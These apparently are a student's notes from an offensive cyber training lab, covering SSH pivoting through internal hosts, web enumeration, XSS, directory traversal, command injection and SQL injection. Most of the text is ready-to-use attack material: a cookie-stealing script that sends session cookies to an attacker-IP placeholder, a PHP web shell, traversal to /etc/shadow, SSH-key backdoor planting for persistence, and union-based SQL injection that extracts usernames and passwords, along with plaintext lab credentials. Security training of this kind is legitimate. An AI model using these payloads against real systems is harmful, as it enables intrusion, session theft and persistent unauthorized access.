# Reconnaissance & Scanning

## Demo Scheme of Maneuver
The network path is structured from the Jump Box through a pivot point to reaching internal targets:

* **Jump Box**
    * **Pivot:** 192.168.28.105
        * **T1:** 192.168.28.27
        * **T2:** 192.168.28.12

### Target Section
#### Pivot Host

| Attribute | Details |
| :--- | :--- |
| **Hostname** | Donovian-Terminal |
| **IP Address** | `192.168.28.105` |
| **OS** | Ubuntu 18.04 |
| **Credentials** | `comrade` :: `StudentReconPassword` |
| **SSH Port** | 2222 |
| **PSP** | rkhunter |
| **Malware** | none |
| **Action** | Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved. |


#### Target 1 (T1)
| Attribute | Details |
| :--- | :--- |
| **Hostname** | unknown |
| **IP Address** | `192.168.28.27` |
| **OS** | Linux ver: Unknown |
| **Credentials** | `comrade` :: `StudentPrivPassword` |
| **Last Known Ports** | unknown |
| **PSP** | unknown |
| **Malware** | unknown |
| **Action** | Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access. |


#### Target 2 (T2)
| Attribute | Details |
| :--- | :--- |
| **Hostname** | unknown |
| **IP Address** | `192.168.28.12` |
| **OS** | Linux ver: Unknown |
| **Credentials** | `comrade` :: `StudentPrivPassword` |
| **Last Known Ports** | unknown |
| **PSP** | unknown |
| **Malware** | unknown |
| **Action** | Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access. |

### Walkthrough
#### 1. Establish Master Control to JumpBox
```bash
ssh -MS /tmp/jump student@10.50.15.247
# Creds: jSmJnXaaKOs7

for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null; done

ssh -S /tmp/jump JumpBox-Tunnel -O forward -L 2222:192.168.28.105:2222
```

#### 2. Establish Master Control to Pivot (Donovian-Terminal)
```bash
ssh -MS /tmp/pivot comrade@192.168.28.105 -p 2222
# Creds: StudentReconPassword
```

#### 3. Start SOCKS Proxy (Masquerade)
```bash
ssh -S /tmp/pivot Pivot-Proxy -O forward -D 9050

# Cancel an active forwarding (if needed)
# ssh -S /tmp/<name> <Host Alias> -O cancel -KD 9050
```

#### 4. Validate Pivot for T1/T2
```bash
proxychains nmap -Pn 192.168.28.27 192.168.28.12 # Both 22 ssh
```

#### 5. Pivot to T1
```bash
ssh -S /tmp/pivot T1-Tunnel -O forward -L 1111:192.168.28.27:22

# Now, establish a new master socket for T1
ssh -MS /tmp/t1 comrade@localhost -p 1111
# Creds: StudentPrivPassword
```

#### 6.  Pivot to T2
```bash
# Create the tunnel using port 3333
ssh -S /tmp/pivot T2-Tunnel -O forward -L 3333:192.168.28.12:22

# Establish the master socket for T2
ssh -MS /tmp/t2 comrade@localhost -p 3333
# Creds: StudentPrivPassword
```

#### Current Port Map Breakdown:
> Port 2222: Mapped to Pivot (.105) — Active
> 
> Port 1111: Mapped to T1 (.27) — Active
> 
> Port 3333: Mapped to T2 (.12) — New

#### If a target is internal to T1
Meaning it's on a private network that only T1 can see

* **Jump Box**
    * **Pivot:** 192.168.28.105
        * **T1:** 192.168.28.27
            * **T3:** 192.168.28.27
        * **T2:** 192.168.28.12

If T3 (x.x.x.x) is only reachable from T1:

#### 1. Use the T1 socket to create a forward to T3:
```bash
# 1. Look for new networks from T1 shell
# (Inside T1 shell): ip addr  OR  route -n

# 2. Forward a local port through the T1 SOCKET to the hidden target
ssh -S /tmp/t1 T1-Tunnel -O forward -L 4444:<Internal_T3_IP>:22

# 3. Establish T3 Master
ssh -MS /tmp/t3 comrade@localhost -p 4444
```

#### Refined Port Map Breakdown
Here is how your notes should look to distinguish between `Broad` pivoting (from Pivot) and `Deep` pivoting (through T1):

> Pivot	Jump ---> .105 ------- Reach the 192.168.28.x network
> 
> T1 Pivot -------> .27 ------------ Gain access to T1 host
> 
> T2 Pivot -------> .12 ------------ Gain access to T2 host (Sibling to T1)
> 
> T3 (Deep)	T1 --> x.x.x.x ---- Access network behind T1

---

# Web Exploitation Day 1:
## Fundamentals Study Guide

## 1.0 Web Fundamentals
*   **Server/Client Relationship**: Client (Browser) requests; Server provides resources.
*   **HTTP Protocol**:
    *   `GET`: Retrieve data.
    *   `POST`: Submit data.
*   **CLI Tools**:
    *   `cURL`: Test APIs and make manual requests.
    *   `WGET`: Batch download or mirror sites.

---

## 2.0 - 4.1 Website Enumeration
*Phase: Discovery. Goal: Identify pages, directories, and vulnerabilities.*

### Key Files
*   **robots.txt**: Located at `http://<IP>/robots.txt`. Lists disallowed paths (e.g., `/admin`, `/backup`).

### Tools & Commands
> **Note**: Use `proxychains` for TCP support. ICMP is NOT supported.


| Tool | Command | Purpose |
| :--- | :--- | :--- |
| **NMAP (Enum)** | `proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>` | Brute-forces common hidden paths. |
| **NMAP (SQLi)** | `proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>` | Finds forms vulnerable to SQL injection. |
| **NMAP (Robots)**| `proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>` | Parses the robots.txt file automatically. |
| **Nikto** | `nikto -h <IP>` | Comprehensive web vulnerability scanner. |

---

## 4.2 - 5.1 Cross-Site Scripting (XSS)
*Injection of malicious client-side JavaScript.*

### Types of XSS
1.  **Reflected (Non-Persistent)**: Script is reflected via a link (e.g., URL parameters). One-time attack.
2.  **Stored (Persistent)**: Script is saved to the database (e.g., comments). Affects all visitors.

### Useful Payloads
*   **Basic Alert (PoC)**: `<script>alert('XSS');</script>`
*   **Cookie Stealer**: 
    ```javascript
    <script>document.location="http://<ATTACKER_IP>/stealer.php?username=" + document.cookie;</script>
    ```
*   **Exfiltration Objects**: `document.cookie` (session tokens), `document.body.innerHTML` (page content).

### Defenses
*   **CORS**: Cross-Origin Resource Sharing.
*   **CSP**: Content Security Policy.

---

## 6.0 Server-Side Injection
*Targeting the server components directly.*

### 6.1 Directory Traversal (Arbitrary File Read)
*   **Action**: Using `../` to navigate outside the web root.
*   **Payload Example**: `http://<IP>/view.php?file=../../../../etc/passwd`
*   **Key Files to Check**: `/etc/passwd`, `/etc/shadow`, `/var/www/html/robots.txt`.

### 6.2 Malicious File Upload
*   **Action**: Uploading a script (e.g., PHP) to execute commands.
*   **Web Shell Example (`shell.php`)**:
    ```php
    <?php if($_GET['cmd']) { system($_GET['cmd']); } ?>
    ```
*   **Execution**: Access via `http://<IP>/uploads/shell.php?cmd=whoami`.

### 6.3 Command Injection
*   **Action**: Chaining OS commands using `;`, `&&`, or `|`.
*   **Payload Example**: `127.0.0.1; cat /etc/passwd`

---

## 7.0 Persistence: SSH Key Upload
*Using injection/upload to gain passwordless shell access.*

1.  **Generate Key (Local)**: `ssh-keygen -t rsa`
2.  **View Public Key**: `cat ~/.ssh/id_rsa.pub`
3.  **Identify Target User**: `whoami` (e.g., `www-data`)
4.  **Find Home Directory**: `cat /etc/passwd | grep www-data` (e.g., `/var/www`)
5.  **Inject/Upload Key**:
    ```bash
    mkdir -p /var/www/.ssh
    echo "ssh-rsa <YOUR_KEY_STRING>" >> /var/www/.ssh/authorized_keys
    ```
6.  **Login**: `ssh www-data@<Target_IP>`

---

## Cleanup (Database)
To remove a stored XSS payload:
```sql
mysql
USE messages;
SELECT * FROM comments;
DELETE FROM comments WHERE id = <ID>;
```

---

# Web Exploitation Day21:
## 🗄️ SQL Injection: Advanced Enumeration & Union Attacks

## 1.0 Detection & Methods
Before injecting, identify how the server handles data.
*   **POST (Forms)**: Test using `'` or `OR 1=1`. 
*   **GET (URL)**: Test directly in the URL (e.g., `?id=2 OR 1=1`). 
    *   *Note*: Integers in URLs often **don't** require a single quote (`Selection=2 OR 1=1`), whereas strings in forms **do** (`tom' OR 1='1`).

### The Goal of the Single Quote (`'`)
We use `'` to **break out** of the developer's intended string so we can append our own SQL commands.

---

## 2.0 Union Select: The Step-by-Step
Used to append results from a different table to the original query's output.

### Step 1: Find the Column Count
Increment numbers until the page loads correctly (no error).
*   `Selection=2 UNION SELECT 1--` (Error? Try next)
*   `Selection=2 UNION SELECT 1,2--` (Error? Try next)
*   `Selection=2 UNION SELECT 1,2,3--` (**Success!** We now know there are 3 columns).

### Step 2: Identify Displayed Columns
Look at the page to see where "1", "2", or "3" appears. This tells you which column is safe to pull text data into.

### Step 3: The "Golden Statement" (Database Mapping)
Use the `information_schema` (a built-in DB that tracks all other DBs) to find targets.


| Goal | Payload (Assuming 3 Columns) |
| :--- | :--- |
| **List Tables** | `UNION SELECT 1, table_name, 3 FROM information_schema.tables--` |
| **List Databases** | `UNION SELECT 1, table_schema, 3 FROM information_schema.tables--` |
| **List Columns** | `UNION SELECT 1, column_name, 3 FROM information_schema.columns--` |
| **The "Golden"** | `UNION SELECT table_schema, table_name, column_name FROM information_schema.columns--` |

---

## 3.0 Advanced Techniques

### 3.1 Commenting (Terminators)
Used to ignore the rest of the legitimate server-side query.
*   `#` : Hash (Common in MySQL).
*   `-- ` : Double-dash + Space (Standard SQL).
*   `/*` : C-style comment.

### 3.2 Nesting & Parenthesis
If the query is wrapped in parentheses like `WHERE id = ('$id')`, your inject must "close" them first:
*   **Payload**: `1') OR 1=1 #`
*   **Becomes**: `WHERE id = ('1') OR 1=1 #')`

### 3.3 System Information
*   `@@version` : Get DB version.
*   `database()` : Get current DB name.
*   `user()` : Get current DB user.
*   *Example*: `UNION SELECT 1, @@version, database()--`

---

## 4.0 Blind SQL Injection
Used when the page **doesn't display data** but changes its behavior (e.g., "Welcome" vs. "Error").
*   **Truth Test**: `?id=1 AND 1=1` (Page looks normal).
*   **False Test**: `?id=1 AND 1=2` (Page content disappears or changes).
*   *Logic*: If the page changes, the field is injectable, even if you can't "see" the data.

---

## 💡 Quick Tips for the Demo Box
1.  **Selection Injection**: If `Selection=2 OR 1=1` works, try `Selection=2 UNION SELECT 1,2,3`.
2.  **Order Matters**: If the server expects an Integer in column 1 but you put a String (`name`), it might error. Swap your `SELECT` positions until it works.
3.  **Cross-DB Querying**: If you find a table in another database: 
    `UNION SELECT 1, name, 3 FROM other_db.target_table--`

# 🗄️ SQL Injection Quick-Reference Cheat Sheet

### 1. Authentication Bypass (Login Forms)
The goal is to make the `WHERE` clause always true or comment out the password check. 


| Strategy | Common Payload | Becomes (Resulting Query) |
| :--- | :--- | :--- |
| **Basic Truth** | `' OR 1=1--` | `WHERE user = '' OR 1=1--' AND pass = '...'` |
| **Admin Direct** | `admin'--` | `WHERE user = 'admin'--' AND pass = '...'` |
| **Parenthesis** | `admin')--` | `WHERE user = ('admin')--') AND pass = '...'` |
| **No Quotes** | `1 OR 1=1` | `WHERE id = 1 OR 1=1` (Used for numeric IDs) |

---

### 2. Union-Based Enumeration (The "Step-by-Step")
Use these in a vulnerable GET or POST parameter to map the database structure.


| Step | Goal | Payload Example |
| :--- | :--- | :--- |
| **1** | Find Columns | `' ORDER BY 1--`, `' ORDER BY 2--` (Repeat until error) |
| **2** | Test Union | `' UNION SELECT 1,2,3--` (Identify which numbers show on screen) |
| **3** | DB Name | `' UNION SELECT 1, database(), 3--` |
| **4** | DB User | `' UNION SELECT 1, user(), 3--` |
| **5** | DB Version | `' UNION SELECT 1, @@version, 3--` |

---

### 3. The "Golden Statements" (Mapping the Schema)
Once you have the correct column count, use `information_schema` to find exactly what to steal.

**List All Tables:**
```sql
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()--
```

**List Columns in a Specific Table:**
```sql
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='your_table_name'--
```

# 🗄️ SQL Injection: GET & POST Methodology

## 🛠️ General Rules
- **Column Matching:** The `UNION` operator requires the exact same number of columns as the original query.
- **Data Types:** The data types in your `SELECT` must match the original query's columns.
- **Nulling the Original:** Often, you must make the first part of the query return nothing (e.g., `id=-1`) to force your `UNION` results to display on the screen.
- **Comments:** Use `#` (MySQL) or `-- ` (Universal) to truncate the rest of the original developer's query.

---

## 📮 POST Method
*Data is sent in the request body (e.g., login forms, search bars).*

### 1. Test for Vulnerability
Inject a single quote or logic to see if the database response changes.
```sql
Audi 'OR 1 ='1
-- or
Audi' OR 1=1 #
```

### 2. Determine Column Count (The "Order By" or "Union" Test) (MOST Important)
Increment the number until the page returns an error to find the count.
- Note: If '2' appears on the webpage, that is your "injection point" where data will be visible.
```sql
-- Column 2 is our hidden value
Audi' UNION SELECT 1,2,3,4,5 #
```

### 3. Map the Schema (The Golden Statement)
Query the `information_schema` to find where the sensitive data lives.
```sql
Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns #
```
**Structure:** `[Placeholders]`, `[Metadata Columns]` FROM `[Internal DB]`.`[Internal Table]`

### 4. Extract Data
The final payoff using the names discovered in Step 3.
```sql
Audi' UNION SELECT studentID,2,username,passwd,jump FROM session.userinfo #
```

## 🌐 GET Method
Data is sent directly in the URL. Special characters must be URL Encoded.

Character	URL Code
- `Space`	+ or %20
- `'` (Quote)	%27
- `#` (Hash)	%23

### Step 1: Test for Vulnerability
Check if the application is processing logic by making the statement always true.
- **Payload:** `?Selection=2 OR 1=1`
- **Full URL:** `http://127.0.0.1:1237/uniondemo.php?Selection=2 or 1=1`

### Step 2: Identify Injection Points
Use `UNION SELECT` to see which column numbers actually display on the webpage.
- **Payload:** `?Selection=-1 UNION SELECT 1,2,3 #`

### Step 2a: Determine Column Count
Use `ORDER BY` to find the number of columns. Keep increasing the number until the page returns an error.
- **Payload:** `?Selection=2 ORDER BY 3 #`

### Step 3: Schema Mapping (The "Golden Statement")
Query the database's internal blueprint to find table and column names.
- **Payload:** `?Selection=2 Union SELECT table_schema,column_name,table_name FROM information_schema.columns #`

### Step 4: Data Extraction
The final step is to pull the sensitive data from the table and columns you discovered in Step 4.
- **Payload:** `?Selection=-1 UNION SELECT studentID,username,passwd FROM session.userinfo #`

### ⚡ Bonus: SQL Version Check
Quickly identify the database version and current database name.
- **Payload:** `?Selection=-1 UNION SELECT @@version,database(),user() #`
- **Full URL:** `http://127.0.0`

##  ⚡ SQL Version & DB Info
Quickly identify the backend environment.
```sql
-- POST:
Audi' UNION SELECT @@version, database(), user(), 4, 5 #
```
```sql
-- GET:
?Selection=-1 UNION SELECT @@version,database(),user() #
```
